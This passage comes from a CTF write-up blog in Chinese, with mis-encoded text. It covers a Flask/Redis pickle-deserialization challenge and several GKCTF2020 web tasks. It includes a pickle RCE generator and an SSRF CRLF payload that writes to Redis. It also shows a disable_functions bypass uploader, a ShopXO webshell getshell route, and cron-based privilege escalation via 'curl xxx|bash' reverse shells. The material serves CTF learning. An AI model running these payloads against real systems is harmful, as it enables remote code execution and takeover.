User(email,username,password)</span><br><span class="line">        cookie = Cookie()</span><br><span class="line">        cookie.create = username</span><br><span class="line">        cookie = cookie.create</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> redis.exists(cookie):</span><br><span class="line">                redis.set(cookie,pickle.dumps(user))</span><br><span class="line">                resp = make_response(redirect(url_for(<span class="string">'home'</span>)))</span><br><span class="line">                resp.set_cookie(<span class="string">"Cookie"</span>,cookie)</span><br><span class="line">                <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"register.html"</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/home/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'Cookie'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> Cookie.verify(cookie) <span class="keyword">and</span> redis.exists(cookie):</span><br><span class="line">            user = redis.get(cookie)</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            <span class="keyword">if</span> request.method != <span class="string">"GET"</span>:</span><br><span class="line">                formlist = request.form.to_dict()</span><br><span class="line">                User.modify_info(user,formlist)</span><br><span class="line">                redis.set(cookie,pickle.dumps(user))</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>,user=user)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>,user=user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"login"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/spider/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'Cookie'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> Cookie.verify(cookie) <span class="keyword">and</span> redis.exists(cookie):</span><br><span class="line">            user = redis.get(cookie)</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">500</span>)</span><br><span class="line">    result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">elif</span> request.method != <span class="string">"GET"</span> <span class="keyword">and</span> request.form.get(<span class="string">'url'</span>)!=<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target_url = request.form.get(<span class="string">'url'</span>)</span><br><span class="line">            new_spider = Spider(target_url)</span><br><span class="line">            result = new_spider.spiderFlag()</span><br><span class="line">        <span class="keyword">except</span> Excetion <span class="keyword">as</span> e:</span><br><span class="line">            result = e</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"spider.html"</span>,result=str(result),user=user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/testSpider/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TSpider</span><span class="params">()</span>:</span></span><br><span class="line">    html = <span class="string">'&lt;div id="flag"&gt;Flag&#123;hahaha This is a test for tested Spider mode&#125;&lt;/div&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(redirect(url_for(<span class="string">'login'</span>)))</span><br><span class="line">    resp.set_cookie(<span class="string">'Cookie'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"error.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        port=<span class="number">5000</span>,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>ä»è°ƒç”¨çš„åŒ…çœ‹åˆ°è¿˜æœ‰ä¸¤ä¸ªè‡ªå®šä¹‰çš„åŒ…ã€‚ä¹Ÿä¸€å¹¶è¯»ä¸‹æ¥ã€<br>sipder.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.target_url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getResponse</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = urllib.request.urlopen(self.target_url).read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            <span class="keyword">return</span> (info, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="keyword">return</span> (err, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spiderFlag</span><span class="params">(self)</span>:</span></span><br><span class="line">        infos = self.__getResponse()</span><br><span class="line">        <span class="keyword">if</span> infos[<span class="number">1</span>]:</span><br><span class="line">            soup = BeautifulSoup(infos[<span class="number">0</span>])</span><br><span class="line">            flag = soup.find(id==<span class="string">'flag'</span>)</span><br><span class="line">            <span class="keyword">return</span> infos[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> flag.text</span><br><span class="line">        <span class="keyword">return</span> infos[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>user.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">-*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="comment"># here put the import lib</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,email,username,password)</span>:</span></span><br><span class="line">        self.email = email</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = md5(password.encode(encoding=<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line">        self.phone = <span class="literal">None</span></span><br><span class="line">        self.qqnumber = <span class="literal">None</span></span><br><span class="line">        self.intro = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_pass</span><span class="params">(self,password)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> password <span class="keyword">and</span> md5(password.encode(encoding=<span class="string">'utf8'</span>)).hexdigest() == self.password:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modify_info</span><span class="params">(obj,dict)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> dict:</span><br><span class="line">            <span class="keyword">if</span> hasattr(obj,key) <span class="keyword">and</span> dict[key]!=<span class="string">''</span>:</span><br><span class="line">                setattr(obj,key,dict[key])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cookie</span><span class="params">(object)</span>:</span></span><br><span class="line">    __key = <span class="string">"abcd"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        __key = <span class="string">"abcd"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.mix_str = (self.username+Cookie.__key).encode(encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        self.md5_str = self.username+md5(self.mix_str).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> self.md5_str</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @create.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self,username)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(verify_cookie)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> verify_cookie:</span><br><span class="line">            username = verify_cookie[:<span class="number">-32</span>]</span><br><span class="line">            verify_str = verify_cookie[<span class="number">-32</span>:]</span><br><span class="line">            <span class="keyword">return</span> md5((username+Cookie.__key).encode(encoding=<span class="string">"utf8"</span>)).hexdigest()==verify_str</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦å¾—åˆ°ä¸¤ä¸ªä¿¡æ¯ã€‚redisæ— å¯†ç ã€‚ä¸”æ˜¯ç”¨æ¥å­˜å‚¨cookieçš„ã€‚è€Œcookieçš„å€¼ä¼šè¢«è°ƒç”¨å‡ºæ¥è¿›è¡Œpickleçš„ååºåˆ—åŒ–ã€‚</p><p>ä¸ç”¨è¯´ï¼Œæˆ‘ä»¬ä¹Ÿå¤§è‡´æ˜ç™½æ€è·¯äº†ï¼šæ“ä½œredisä¿®æ”¹cookieé”®å¯¹åº”çš„å€¼ã€‚ç”¨cookieåˆ·æ–°è§¦å‘ååºåˆ—åŒ–RCEã€‚<br>è¿™ä¸ªè€ƒç‚¹åœ¨å»å¹´çš„swpuctfçš„web2ä¸­ä¹Ÿå‡ºç°è¿‡ã€‚å¯æƒœè‡ªå·±å› ä¸ºç¯å¢ƒé—®é¢˜ä¸€ç›´æ²¡èƒ½åœ¨buuä¸Šåšã€‚</p><p>è¿™é‡ŒåŸºäºæºç æ¯”è¾ƒé½å…¨ã€‚æˆ‘å°±æœ¬åœ°ç®€å•æ­å»ºäº†ä¸€ä¸ªserverã€‚ç„¶åè§¦å‘ä¸€ä¸ªç”Ÿæˆcookieå­˜å‚¨çš„è¿‡ç¨‹ã€‚çœ‹çœ‹å¤§è‡´çš„å­˜å‚¨è§„å¾‹<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å®é™…ä¸Šå°±æ˜¯ä»¥æˆ‘ä»¬çš„cookieä½œä¸ºé”®ï¼Œpickleçš„opcodeä½œä¸ºå€¼ï¼Œæ¯”flaskçš„é»˜è®¤å­˜å‚¨ç›´è§‚å¾ˆå¤šã€‚</p><p>é‚£ä¹ˆå¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬ç”Ÿæˆä¸‹RCEä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">"__import__('os').system('echo `ls /` &gt; /tmp/byc')"</span>,))</span><br><span class="line">a = exp()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºäº†ä¸ç»™æœåŠ¡å™¨å¸¦æ¥å›°æ‰°ï¼Œç›´æ¥æŠŠæ ¹ç›®å½•lsçš„ç»“æœå†™åˆ°tmpç›®å½•ä¸‹ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½ç”¨è¯»æ–‡ä»¶çš„é€”å¾„ç›´æ¥è¯»äº†ã€‚</p><p>å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aset &quot;byc40418e2b681af1051d6fcb32e3d3f7071f6&quot; &quot;\x80\x03cbuiltins\neval\nq\x00X7\x00\x00\x00__import__(&#39;os&#39;).system(&#39;echo &#96;ls &#x2F;&#96; &gt; &#x2F;tmp&#x2F;byc4&#39;)q\x01\x85q\x02Rq\x03.&quot;%0d%0apadding</span><br></pre></td></tr></table></figure><p>å¼€å§‹æˆ‘åœ¨æ‹…å¿ƒç¼–ç é—®é¢˜ã€‚åæ¥å‘ç°åº”è¯¥ä¸ç”¨åœ¨æ„ã€‚ç›´æ¥ç”¨python3çš„opcodeç»“æœå°±å¯ä»¥äº†ã€‚<br>åˆ·æ–°ä¸‹cookieå¯¹åº”é¡µé¢,ç„¶åè¯»æ–‡ä»¶<code>file:///tmp/byc4</code><br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥è¯»flagäº†ã€‚å½“ç„¶åé¢æˆ‘è¯•äº†ä¸‹ç›´æ¥ç”¨<code>curl xxx|bash</code>å¼¹ä¸ªshellä¹Ÿæ˜¯å¯ä»¥çš„ã€‚æ–¹æ³•æœ‰å¾ˆå¤šã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ä¸¤é“é¢˜éƒ½ç®—æ˜¯phpä¸redisä»¥åŠpythonä¸redisçš„ç»å…¸æ­é…äº†ã€‚å½“ç„¶redisçš„åˆ©ç”¨è¿˜æœ‰å¾ˆå¤šï¼Œä»¥åä¼šæ…¢æ…¢å­¦ä¹ ã€‚</p><p>ç„¶åRCTFé™©äº›çˆ†é›¶â€¦â€¦calcè¿™é¢˜çœŸçš„æ˜¯å¤ªè€ƒéªŒåŸºæœ¬åŠŸäº†ã€‚åšçš„äººå¿ƒç´¯ã€‚</p><p>æœ€åå°±è¦æ”¶å¿ƒå¥½å¥½å¤ä¹ äº†ã€‚è¿™å­¦æœŸå¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨äº†ctfä¸Šï¼Œè¯¾ä¸šä¸åƒä»¥å¾€é‚£æ ·å¿ƒé‡Œæœ‰åº•äº†ã€‚æ„Ÿè§‰å¾—å¥½å¥½å¤ä¹ ä¸€æŠŠã€‚ç°åœ¨CTFé©¬ä¸Šä¹Ÿå¿«æ‰“ä¸€å¹´äº†ï¼Œè‡ªå·±å¾ˆé«˜å…´æ°´å¹³æ¯”ä»¥å¾€è¦é«˜äº†ä¸å°‘ã€‚ä½†æ˜¯è‡ªå·±ä½œä¸ºx1cçš„webæ‰‹ï¼Œè¿˜æ˜¯æ„Ÿè§‰å®åŠ›è·Ÿåˆ«çš„å¼ºé˜Ÿç›¸æ¯”å·®äº†ä¸å°‘ã€‚å¸Œæœ›æš‘å‡èƒ½å¥½å¥½ç ”ç©¶ä¸‹è‡ªå·±æƒ³å­¦çš„ä¸œè¥¿,å°½é‡è¿‡çš„å……å®ç‚¹å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020writeup</title>
      <link href="2020/05/24/GKCTF2020writeup/"/>
      <url>2020/05/24/GKCTF2020writeup/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‘¨æœ«æ‰“äº†ä¸¤ä¸ªæ¯”èµ›ã€‚BJDCTF3rdä¸GKCTF.è¿™é‡Œä¸ªäººè®¤ä¸ºGKCTFçš„é¢˜ç›®æ”¶è·æŒºå¤šçš„,ä½†æ˜¯æ—¶é—´å¤ªç´§ï¼Œè‡ªå·±ä¹Ÿåœ¨ç®€å•é¢˜ä¸Šæµªè´¹äº†ä¸å°‘æ—¶é—´ã€‚æ‰€ä»¥æŠŠæ¯”èµ›æ—¶æ²¡æ¥çš„åŠçœ‹æˆ–è€…æ²¡åšå‡ºæ¥çš„é¢˜éƒ½è¡¥å…¨ã€‚</p><a id="more"></a><h2 id="check-in"><a href="#check-in" class="headerlink" title="check_in"></a>check_in</h2><p>é¢˜ç›®ç»™å‡ºäº†æºç ã€‚åŸºæœ¬æœºç†å°±æ˜¯ä»<code>$_REQUEST</code>é‡Œè·å–Ginkgoå˜é‡ç„¶åevalæ‰§è¡Œã€‚<br>phpinfo()çš„è¯ä¼šå‘ç°å­˜åœ¨<code>disable_function</code>,åˆ—ç›®å½•ä¼šå‘ç°æ ¹ç›®å½•æœ‰readflag.<br>ä½†æ˜¯ä¸è¦ç´§ã€‚æˆ‘ä»¬æœ‰bypassè„šæœ¬ç”¨,ä¸‹é¢å°±æ˜¯ä¹‹å‰åšbuuä¸Šä¸€é“<code>l33t-hoster</code>çš„è„šæœ¬æ‹¿æ¥æ”¹çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://5e0893e9-0a1c-4836-8865-2771c87a52e4.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">"Ginkgo"</span>:base64.b64encode(payload.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)&#125;</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"move_uploaded_file($_FILES['file']['tmp_name'],'/tmp/exploit.php');echo 'ok';var_dump(scandir('/tmp'));"</span></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'exploit.php'</span>,open(<span class="string">"exploit.php"</span>,<span class="string">"rb"</span>),<span class="string">'application/octet-stream'</span>))]</span><br><span class="line">r = requests.post(url=url,data=command(payload),files=files)</span><br><span class="line">r=requests.post(url=url,data=command(<span class="string">'include("/tmp/exploit.php");'</span>))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>è„šæœ¬è¦ä¼ åˆ°<code>/tmp</code>ä¸‹,å¦åˆ™å…¶ä»–ç›®å½•åº”è¯¥æ˜¯ä¸å¯å†™çš„ã€‚ç„¶ååŒ…å«å³å¯ã€‚</p><h2 id="è€å…«å°è¶…å¸‚å„¿"><a href="#è€å…«å°è¶…å¸‚å„¿" class="headerlink" title="è€å…«å°è¶…å¸‚å„¿"></a>è€å…«å°è¶…å¸‚å„¿</h2><p>è¿™é¢˜è¯´å®è¯æŒºç®€å•çš„ã€‚å°±æ˜¯æ‰‹æ…¢äº†å‡ æ­¥ã€‚<br>é¦–å…ˆåå°getshellä¸è®²äº†,ä¸»è¦æ˜¯æŒ‰ç…§ç½‘ä¸Šèƒ½æœåˆ°çš„<br>ShopXOå…¨ç‰ˆæœ¬getshellæµç¨‹èµ°ï¼šå…ˆé»˜è®¤å¯†ç ç™»å½•åå°,ä¸‹è½½ä¸»é¢˜å¹¶åŠ ä¸Šwebshellbyc.php,å†é‡æ–°ä¸Šä¼ zipæ–‡ä»¶,è®¿é—®<code>/public/static/index/default/byc.php</code>å³å¯.</p><p>æ‹¿åˆ°www-dataçš„shellåå‘ç°éœ€è¦ææƒã€‚ç„¶åæ ¹ç›®å½•<code>flag.hint</code>é‡Œç»™äº†ä¸ªæ—¥æœŸ.ä¸è¿‡æˆ‘å¹¶æ²¡æœ‰æ€ä¹ˆåœ¨æ„è¿™ä¸ªæ—¥æœŸ,è€Œæ˜¯æŒ‰ç…§è‡ªå·±htbæ¸—é€çš„ä¹ æƒ¯æ¥.</p><p>é¦–å…ˆç†è®ºä¸Šåº”è¯¥æ¥ä¸ªæ‰«æè„šæœ¬çš„ã€‚ä¸è¿‡è¿™é‡Œå¾ˆæ˜æ˜¾å°±èƒ½åœ¨æ ¹ç›®å½•<code>ls -la</code>æ—¶å‘ç°<code>auto.sh</code>æ˜¯rootç”¨æˆ·è¿è¡Œä¸€ä¸ªpythonè„šæœ¬ï¼Œæ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚æ‰¾åˆ°pythonè„šæœ¬åå‘ç°æœ‰å†™çš„æƒé™ã€‚</p><p>é‚£å°±å¾ˆç®€å•äº†,ç›´æ¥å†™å…¥å‘½ä»¤<code>import os;os.system(&#39;curl xxx|bash&#39;)</code><br>(è¿™é‡Œä¹‹å‰ä¸ºäº†å¼¹www-dataçš„shellæå‰å‡†å¤‡å¥½äº†åå¼¹è„šæœ¬)ç„¶åç­‰å¾…ç›‘å¬çš„ç«¯å£è¿”å›rootshellå³å¯ã€‚flagåœ¨rootç›®å½•ä¸‹</p><h2 id="EZä¸‰å‰‘å®¢-EzWeb"><a href="#EZä¸‰å‰‘å®¢-EzWeb" class="headerlink" title="EZä¸‰å‰‘å®¢-EzWeb"></a>EZä¸‰å‰‘å®¢-EzWeb</h2><p>è¿™é¢˜äºŒè¡€ã€‚ç®—æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„é¢˜ç›®ã€‚</p><p>é¦–å…ˆä¼šå‘ç°é¦–é¡µåŠŸèƒ½ä¼¼ä¹æ˜¯ä¸ªssrfã€‚ç„¶åè¿˜ç»™å‡ºäº†<code>?secret</code>å‚æ•°çœ‹ipåœ°å€.<br>ä¸è¿‡å…¶å®è¿™é‡Œå¹¶ä¸éœ€è¦ç»™ipçš„,å› ä¸ºå¯ä»¥ç›´æ¥è¯»<code>/etc/hosts</code></p><p>å½“ç„¶,æƒ³è¦å¸¸è§„çš„fileåè®®è¯»è‚¯å®šæ˜¯ä¸è¡Œçš„.ä½†æ˜¯å®ƒè¿‡æ»¤çš„ä¸ä¸¥ï¼Œå¯ä»¥ç”¨ç±»ä¼¼xxeé‡Œåˆ©ç”¨fileåè®®åˆ—ç›®å½•çš„æ–¹å¼æ¥è¯»<br><code>file:/var/www/html/index.php</code><br>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">        <span class="comment">//echo $url."\n";</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span>, $url,$match))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//var_dump($match);</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'åˆ«è¿™æ ·'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'secret'</span>]))&#123;</span><br><span class="line">    system(<span class="string">'ifconfig'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡flagå¹¶ä¸åœ¨æœ¬æœº173.92.140.13ã€‚å®é™…ä¸Šè¿™ç§æ–¹å¼æƒ³è¯»æ 